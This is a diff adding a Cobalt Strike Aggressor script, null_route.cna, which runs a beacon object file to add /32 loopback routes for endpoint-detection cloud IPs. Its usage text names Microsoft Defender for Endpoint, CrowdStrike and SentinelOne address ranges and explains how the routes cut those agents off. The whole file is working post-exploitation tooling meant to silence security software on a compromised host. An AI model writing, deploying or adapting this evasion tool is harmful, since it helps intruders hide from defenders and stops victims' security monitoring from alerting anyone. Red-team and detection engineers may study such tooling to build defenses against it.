@@ -1,0 +1,87 @@
+# null_route.cna — Aggressor script for null_route BOF
+#
+# Add /32 host routes pointing EDR cloud IPs at 127.0.0.1 on the loopback
+# interface. TCP SYNs to these IPs are delivered to loopback where nothing
+# is listening — immediate RST. No packet ever leaves the NIC.
+#
+# Complements nrpt_sinkhole: covers EDR agents that have cloud IPs hardcoded
+# and bypass DNS entirely.
+#
+# Usage:
+#   null_route 52.183.20.1;13.89.176.1    add /32 blackhole routes
+#   null_route remove 52.183.20.1          remove specific routes
+
+alias null_route {
+    local('$bof $args $bid $handle $path $mode $ips');
+    $bid  = $1;
+    $path = script_resource("null_route.x64.o");
+
+    $handle = openf($path);
+    if ($handle is $null) {
+        berror($bid, "[null_route] Cannot open BOF: " . $path);
+        return;
+    }
+    $bof = readb($handle, 1048576);
+    closef($handle);
+    if ($bof is $null) {
+        berror($bid, "[null_route] readb failed for: " . $path);
+        return;
+    }
+    println("[null_route] loaded " . strlen($bof) . " bytes from " . $path);
+
+    if (size(@_) == 1) {
+        # No args — show usage
+        berror($bid, "[null_route] Usage:\n" .
+            "  null_route <IPs>           add blackhole routes (semicolon-separated)\n" .
+            "  null_route remove <IPs>    remove blackhole routes");
+        return;
+
+    } else if ($2 eq "remove" && size(@_) >= 3) {
+        # null_route remove 1.2.3.4;5.6.7.8
+        $mode = 1;
+        $ips  = $3;
+        btask($bid, "Null Route: removing blackhole routes for -> " . $3);
+
+    } else if ($2 eq "remove") {
+        berror($bid, "[null_route] 'remove' requires an IP list.\n" .
+            "  Usage: null_route remove 1.2.3.4;5.6.7.8");
+        return;
+
+    } else {
+        # null_route 1.2.3.4;5.6.7.8
+        $mode = 0;
+        $ips  = $2;
+        btask($bid, "Null Route: adding blackhole routes for -> " . $2);
+    }
+
+    # i = int32 (mode), Z = null-terminated wide string (IP list)
+    $args = bof_pack("iZ", $mode, $ips);
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+beacon_command_register(
+    "null_route",
+    "Blackhole EDR cloud IPs via /32 loopback routes (immediate RST on connect)",
+    "Usage:\n" .
+    "  null_route <IPs>           add /32 routes to 127.0.0.1 for each IP\n" .
+    "  null_route remove <IPs>    remove those /32 routes\n\n" .
+    "Examples:\n" .
+    "  null_route 52.183.20.1;13.89.176.1;20.190.128.1\n" .
+    "  null_route remove 52.183.20.1;13.89.176.1\n\n" .
+    "Mechanism:\n" .
+    "  Creates MIB_IPFORWARDROW entries via CreateIpForwardEntry:\n" .
+    "    destination:  <IP>/32  (host route, most-specific match)\n" .
+    "    next hop:     127.0.0.1 on loopback interface\n" .
+    "    metric:       1 (wins over any existing default/subnet route)\n" .
+    "  When EDR calls connect() to the cloud IP:\n" .
+    "    -> routing lookup returns loopback IF\n" .
+    "    -> SYN goes to loopback, no service bound\n" .
+    "    -> immediate RST / ECONNREFUSED\n" .
+    "    -> no packet exits the NIC\n\n" .
+    "Common EDR IP ranges (obtain with: Resolve-DnsName <edr_domain>):\n" .
+    "  MDE (Azure):         20.190.x.x, 52.183.x.x, 13.89.x.x\n" .
+    "  CrowdStrike:         35.232.x.x, 34.x.x.x  (GCP)\n" .
+    "  SentinelOne:         54.x.x.x, 3.x.x.x     (AWS)\n\n" .
+    "Requires: Administrator\n" .
+    "Verify:   route print | Select-String \"127.0.0.1\""
+);
